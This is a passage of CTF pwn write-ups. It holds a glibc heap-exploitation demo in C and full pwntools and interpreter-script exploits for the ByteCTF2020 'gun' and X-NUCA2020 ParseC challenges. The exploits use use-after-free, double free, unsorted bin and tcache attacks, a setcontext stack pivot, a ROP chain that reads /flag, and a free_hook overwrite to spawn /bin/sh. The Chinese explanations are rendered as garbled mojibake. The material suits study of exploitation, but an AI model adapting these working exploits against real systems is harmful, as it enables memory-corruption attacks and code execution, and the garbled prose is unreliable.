#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0x10a38c
int main (void)
{
    unsigned long libc_base;
    char *a[10];
    setbuf(stdout, NULL); // make printf quiet
    /* leak libc */
    a[0] = malloc(0x500); /* UAF chunk */
    a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
    printf("%p\n",offset2size(PRINTF_FUNCTABLE - MAIN_ARENA) );
    printf("%p\n",offset2size(PRINTF_ARGINFO - MAIN_ARENA) );
    a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
    a[3] = malloc(0x500); /* avoid consolidation */
    free(a[0]);
    libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
    printf("libc @ 0x%lx\n", libc_base);
    /* prepare fake printf arginfo table */
    *(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
    /* unsorted bin attack */
    *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
    a[0] = malloc(0x500); /* overwrite global_max_fast */
    /* overwrite __printf_arginfo_table and __printf_function_table */
    free(a[1]);
    free(a[2]);
    /* ignite! */
    printf("%X", 0);
    
    return 0;
}

```

exp

1. Ê≥ÑÈú≤ libc Âú∞ÂùÄ
2. unsortedbin attack Êää global_max_fast ÂèòÂ§ß
3. Áî®Áõ∏ÂØπË¶ÜÂÜôÊää fake arginfo table Âú∞ÂùÄÂÜôÂà∞ __printf_arginfo_table
4. Áî®Áõ∏ÂØπË¶ÜÂÜôÊää __printf_function_table ÂÜô‰∏∫ NULL
5. Ë∞ÉÁî®Â∏¶Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑ printf

```python
from pwn import *
#r = process('./pwn')

def menu(choice):
	r.recvuntil('Your choice:')
	r.sendline(str(choice))


def add(index,size):
	menu(1)
	r.recvuntil('Index:')
	r.sendline(str(index))
	r.recvuntil('Size:')
	r.sendline(str(size))

def edit(index,data):
	menu(2)
	r.recvuntil('Index:')
	r.sendline(str(index))
	r.recvuntil('Content:')
	r.sendline(data)

def show(index):
	menu(3)
	r.recvuntil('Index:')
	r.sendline(str(index))

def delete(index):
	menu(4)
	r.recvuntil('Index:')
	r.sendline(str(index))	

def leave():
	menu(5)

def name(name):
	r.recvuntil('name:')
	r.sendline(name)


name('%X')
add(0,0x500)
add(1,0x9420)
add(2,0x1850)
add(3,0x500)
delete(0)
show(0)
r.recvuntil('Content: ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak-0x3ebca0
one = libc_base + 0x10a45c
#*(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
edit(2,'\x00'*((ord('X') - 2) * 8)+p64(one))
global_max_fast = libc_base + 0x3ed940
edit(0,p64(leak)+p64(global_max_fast-0x10))
add(4,0x500)
delete(1)
delete(2)
#leave()
r.interactive()

```



## ByteCTF2020 gun

shoot ÈìæË°®Ê≤°Ê∏ÖÈõ∂ÔºåÂ≠òÂú®uafÔºåÂèØ‰ª•leakÔºå‰πüÂèØ‰ª•double free„ÄÇglibc2.31Ôºåtcache‰∏çËÉΩÁõ¥Êé• double freeÔºåÈúÄË¶ÅÂÖàÂ°´Êª°ÁÑ∂ÂêéËøõ fastbinÔºåÂÜçÂèñÂá∫Êù•ËøõË°å tcache attackÂºÄ‰∫ÜÊ≤ôÁÆ±Ôºåorw„ÄÇ

ÂèØ‰ª•Âà©Áî®setcontext„ÄÇÂú®glibc2.31‰∏≠ÈÄâÊã©setcontext+61ÔºåÈúÄË¶ÅËøõË°åÊ†àËøÅÁßªÔºåÊääÊ†àËøÅÁßªÂà∞Â†Ü‰∏ä

ÂÅöÁöÑÊó∂ÂÄôÁõ¥Êé•ÁÖßÁùÄËøôÁØá[ÂçöÂÆ¢](https://www.lyyl.online/2020/09/11/2020-%E7%BE%8A%E5%9F%8E%E6%9D%AF-%E9%83%A8%E5%88%86PWN-WrieUp/f)ÊîπÁöÑ

Áî®‰∫ÜËøô‰∏™gadget

```c
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
```

gadgetÂÜôÂÖ•freehookÔºåropÈìæÁ≠âÊï∞ÊçÆÂú®Â†Ü‰∏äÂ∏ÉÁΩÆÂ•ΩÂêéÔºåÊâßË°åfreeÂèØ‰ª•Ëß¶Âèë

```python
from pwn import *
def debug():
    print pidof(r)
    pause()

def send_name(name):
    r.recvuntil("name: ")
    r.sendline(name)

def shoot(times):
    r.recvuntil("Action>")
    r.sendline("1")
    r.recvuntil("time:")
    r.sendline(str(times))


def load(idx):
    r.recvuntil("Action>")
    r.sendline("2")
    r.recvuntil("load?")
    r.sendline(str(idx))


def buy(size, content):
    r.recvuntil("Action>")
    r.sendline("3")
    r.recvuntil("price")
    r.sendline(str(size))
    r.recvuntil("Name")
    r.send(content)


#r = process("./gun", level="info", aslr=False)


send_name("A" * 0x18)
buy(0x409, "FOR_LEAK_USE\n")
buy(0x10, "NO_CONSOLIDATE\n")
load(0)
shoot(1)
buy(0x10, "\n")
load(1)
load(0)
shoot(2)




r.recvuntil("The ")
#leak = u64(r.recvuntil("\x15") + "\x00\x00")
leak = u64(r.recvuntil("\x7f") + "\x00\x00")
libc_base = leak - 0x1ebbe0 - 0x3f0


print hex(libc_base)
buy(0x60, "fastbin\n")#0
buy(0x60, "fastbin\n")#1
buy(0x60, "fastbin\n")#2
buy(0x60, "fastbin\n")#3
buy(0x60, "fastbin\n")#4
buy(0x60, "fastbin\n")#5
buy(0x60, "fastbin\n")#6
buy(0x60, "fastbin\n")#7
buy(0x60, "fastbin\n")#8
buy(0x60, "fastbin\n")#9
buy(0x60, "fastbin\n")#10
load(0)
load(1)
load(2)
load(3)
load(4)
load(5)
load(6)
load(7)
load(8)
shoot(9)
buy(0x60, "fastbin\n")#0
load(0)
load(9)
shoot(2)
load(10)
shoot(2)


r.recvuntil('Pwn! The fastbin bullet fired.')
r.recvuntil('Pwn! The ')
heap_leak = u64(r.recvuntil(' bullet fired.',True).ljust(8,'\x00'))


heap_base = heap_leak+0x555555559000-0x5555555592e0
log.success(hex(heap_base))
libc = ELF('./libc-2.31.so')
free_hook = libc_base+libc.sym['__free_hook']
environ = libc_base+libc.sym['environ']
setcontext = libc_base+libc.sym['setcontext']
buy(0x60, "free_hook\n")
buy(0x60, "free_hook\n")
buy(0x60, "free_hook\n")
buy(0x60, "free_hook\n")
buy(0x60, "free_hook\n")
buy(0x60, "free_hook\n")
buy(0x60, "free_hook\n")
buy(0x60, p64(free_hook)+'\n')
buy(0x60, p64(free_hook)+'\n')
buy(0x60, p64(free_hook)+'\n')




libc.address = libc_base
context.arch = 'amd64'




p_rdi_r = 0x0000000000026b72 + libc.address
p_rsi_r = 0x0000000000027529 + libc.address
p_rax_r = 0x000000000004a550 + libc.address
p_rdx_r12_r = 0x000000000011c371 + libc.address
syscall = 0x000000000002584d + libc.address
ret = 0x0000000000025679 + libc.address


magic = 0x154930+libc_base
buy(0x60,p64(magic)+'\n')#10
buy(0x100, "/flag\x00\n")#11


flag_str_address = heap_base - 0x555555559000+0x5555555597e0+0x10
flag_w_address = heap_base - 0x555555559000+0x5555555597e0+0x10
orw_address = heap_base - 0x555555559000+0x555555559a10+0x10
frame_address = heap_base - 0x555555559000+0x5555555598f0+0x10+0x10
log.info(hex(frame_address))


orw = flat([
    p_rdi_r, flag_str_address,
    p_rsi_r, 0,
    libc.sym['open'],
    p_rdi_r, 3,
    p_rsi_r, flag_w_address,
    p_rdx_r12_r, 0x40, 0,
    libc.sym['read'],
    p_rdi_r, 1,
    p_rsi_r, flag_w_address,
    p_rdx_r12_r, 0x40, 0,
    libc.sym['write']
])


payload = p64(0) + p64(frame_address)
payload += p64(0)*4 + p64(setcontext+61)
payload += b"\x00"*(0xa0-0x28) + p64(orw_address) + p64(ret)
buy(0x110,payload+'\n')#12


buy(0x120, orw+'\n')#13
load(12)
log.success(hex(magic))
r.interactive()

```



## X-NUCA2020-ParseC

c ËØ≠Ë®ÄÂÜôÁöÑËß£ÈáäÂô®ÔºåËÄÉËôëÂà∞Âá∫È¢ò‰∫∫Â§ßÊ¶ÇÁéá‰∏ç‰ºö‰∏∫‰∫ÜÂá∫È¢ò‰∏ìÈó®ÂÜô‰∏™Ëß£ÈáäÂô®ÔºåÊâÄ‰ª•ÁåúÊµãÊ∫êÁ†ÅÊòØÊãΩÂà´‰∫∫ÁöÑÔºåÊâæ‰∏ÄË°å‰ª£Á†ÅÂéª GitHub Êêú‰∏ÄÊ≥¢ÔºåÊâæÂà∞ÂéüÈ°πÁõÆÔºåÂΩ≥‰∫ç

https://github.com/yunwei37/tryC

ÈÇ£ÂøÖÊòØÂ°ûÊ¥ûÔºåÂíåÈ¢òÁõÆÊñá‰ª∂ diffÔºåÂèëÁé∞Â§ö‰∫ÜÂ≠óÁ¨¶‰∏≤Á±ªÂûãÔºåÊµãËØïÂèëÁé∞Â≠óÁ¨¶‰∏≤Â≠òÂú® uafÔºåÂΩ≥‰∫ç„ÄÇ

ÈÄöËøá‰∏Ä‰∏™ unsorted bin ÁöÑ uaf ÂèØ‰ª•ËΩªÊùæÊ≥ÑÈú≤ libc Âü∫ÂùÄ„ÄÇ

‰∫§‰∫íÊó∂ÁöÑËæìÂÖ•ÁöÑÊï∞ÊçÆÁªèËøá atof Â§ÑÁêÜÂêéÂÇ®Â≠òÔºå‰∏î read ‰∏çËÉΩÂØπÂ≠óÁ¨¶‰∏≤ËøõË°åÊìç‰Ωú„ÄÇ

ËÄÉËôëÁ≤æÂøÉÊûÑÈÄ†Â†ÜÂ∏ÉÂ±ÄÔºåÂú®ËæìÂÖ•ÁöÑ code Êñá‰ª∂‰∏≠ÔºåÂà©Áî® double free Ë¶ÜÁõñ free chunk ÁöÑ fd ÁöÑ‰∏ÄÂ≠óËäÇÔºåÊâì‰π±Ê≠£Â∏∏ÁöÑÂ†ÜÂ∏ÉÂ±ÄÔºåÂêåÊó∂‰πüÂèØ‰ª•‰øÆÊîπ chunk sizeÔºåÈÄ†ÊàêÂ†ÜÂùóÈáçÂè†„ÄÇ

ÊéßÂà∂ fd ÊåáÂêë freehook ÂíåÂêë freehook ÂÜôÂÖ•Êï∞ÊçÆÂè™ËÉΩÈÄöËøá‰∫§‰∫íÂÆåÊàêÔºåÁî±‰∫é read Âè™ËÉΩÂØπÊµÆÁÇπÊï∞Êìç‰ΩúÔºåÊâÄ‰ª•ÈúÄË¶Å‰ΩøÁî®Â†ÜÂùóÈáçÂè†ÂíåÈîô‰ΩçÔºå‰Ωø‰∏Ä‰∏™Â§ßÂ∞è‰∏∫ 0x50 ÁöÑ free chunk ÁöÑ fd ÂàöÂ•Ω‰∏∫‰∏Ä‰∏™ ÊµÆÁÇπÊï∞ÁªÑÂÇ®Â≠òÊµÆÁÇπÊï∞ÁöÑ‰ΩçÁΩÆ„ÄÇ

ËæìÂÖ•ÊµÆÁÇπÊï∞Ôºåatof ÂèØ‰ª•Â§ÑÁêÜÁßëÂ≠¶ËÆ∞Êï∞Ê≥ïÔºåÊâÄ‰ª•ÂèØ‰ª•ÈÄöËøáÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÂÜôÂÖ•‰ªªÊÑèÂÄºÔºåËøôÈáåÁî® js ËÑöÊú¨Â§ÑÁêÜÔºåÊâãÂä®ËæìÂÖ•„ÄÇ

```javascript
class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.u32 = new Uint32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[0] + tmp[1] * 0x100000000;
    }
}
mem = new Memory();

console.log(mem.u2f(0x7f9d01b288c0))
```

‰∏§Ê¨° readÔºåÂÜôÂÖ• freehook Âú∞ÂùÄ Âíå system Âú∞ÂùÄÔºåÁÑ∂Âêé free ‰∏Ä‰∏™ /bin/sh Â≠óÁ¨¶‰∏≤

ËøúÁ®ãÂíåÊú¨Âú∞ÁöÑÂ†ÜÂú®Âú∞ÂùÄ‰∏äÁõ∏Â∑Æ 0x10ÔºåÊú¨Âú∞ÊâìÈÄöÂêé‰øÆÊîπË¶ÜÁõñÂÄºÂç≥ÂèØ„ÄÇ

Êú¨Âú∞exp

```javascript
puts("AAAA");
a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
b = a;
c = a;
a = "AAAAAAAA";
puts(b);//leak
pad = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
pad1 = "aaaaaaaa";//malloc(0x10)
pad2 = "aaaaaaaa";//malloc(0x10)
db = "aaaaaaaa";//malloc(0x10)
overlap = db;
fuck2 = db;
fuck3 = db;
db = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
overlap = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";//malloc(0x30)
overlap_fuck_ptr = overlap;
overlap_fuck_ptr2 = overlap;
overlap_fuck_ptr3 = overlap;
newdb = db;
fuck3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";//malloc(0x30)
fucksize = "0";//malloc(0x10) local
fucksize1 = "0";//malloc(0x10) local
fucksize2 = "00000000q";//malloc(0x10) fuck size
overlap_fuck_ptr2 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";//free
newdb = "aaaaaaaa";//malloc(0x10)
overlap2 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
//malloc(0x380)
overlap3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

//malloc(0x20)
fuckfdaboveaboveabove="a";
fuckfdaboveabove="a";//malloc(0x10)
fuckfdaboveaboveptr1=fuckfdaboveabove;
fuckfdaboveaboveptr2=fuckfdaboveabove;
fuckfdaboveaboveptr3=fuckfdaboveabove;
fuckfdaboveaboveptr4=fuckfdaboveabove;
fuckfdaboveaboveptr5=fuckfdaboveabove;
fuckfdaboveaboveptr6=fuckfdaboveabove;
fuckfdaboveaboveptr7=fuckfdaboveabove;

fuckfdabove="a";//malloc(0x10)
fuckfdaboveptr1=fuckfdabove;
fuckfdaboveptr2=fuckfdabove;
fuckfdaboveptr3=fuckfdabove;
fuckfdaboveptr4=fuckfdabove;
fuckfdaboveptr5=fuckfdabove;
fuckfdaboveptr6=fuckfdabove;
fuckfdaboveptr7=fuckfdabove;
//fuckoverlap31 = overlap3;
//fuckoverlap32 = overlap3;
//overlap3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
//fuckoverlap31 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
//malloc(0x100)
fuckfd = " ";//mallochook-0x10
fuckfdptr1 = fuckfd;
fuckfdptr2 = fuckfd;
fuckfdptr3 = fuckfd;
fuckheap = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckheapptr1 = fuckheap;
fuckheapptr2 = fuckheap;
fuckheapptr3 = fuckheap;
fuckheapptr4 = fuckheap;
fuckfdaboveaboveptr1 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr2 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

fuckfd201 = "0";
fuckfd202 = "AAAAAAAA";
fuckfd203 = "aaaaaaaaQ";

fuckfdaboveptr1 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

fuckfdaboveaboveptr4 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr5 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr6 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

fuckfd501 = "@";
fuckfd502 = "AAAAAAAA";
fuckfd503 = "h";

array xjbarr1(1);
fucknum=0.1;
read(fucknum);
xjbarr1[0]=fucknum;
print(xjbarr1[0]);

array xjbarr2(1);

array xjbarr3(1);
fucknum3=0.1;
read(fucknum3);
xjbarr3[0]=fucknum3;

getshell="/bin/sh";
getshell = "1";
read();

```



ËøúÁ®ãexp

```javascript
puts("AAAA");

a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
b = a;
c = a;
a = "AAAAAAAA";
puts(b);//leak

pad = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa